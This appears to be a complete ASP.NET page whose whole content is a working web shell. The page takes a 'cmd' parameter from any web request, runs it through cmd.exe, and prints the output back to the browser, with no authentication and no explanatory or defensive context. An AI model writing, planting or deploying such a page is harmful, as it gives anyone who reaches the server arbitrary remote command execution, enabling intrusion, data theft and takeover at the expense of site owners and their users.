<%@ Page Language="C#" %>
<%
    string cmd = Request["cmd"];
    if (!string.IsNullOrEmpty(cmd)) {
        var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + cmd);
        psi.RedirectStandardOutput = true; psi.UseShellExecute = false;
        var p = System.Diagnostics.Process.Start(psi);
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
%>
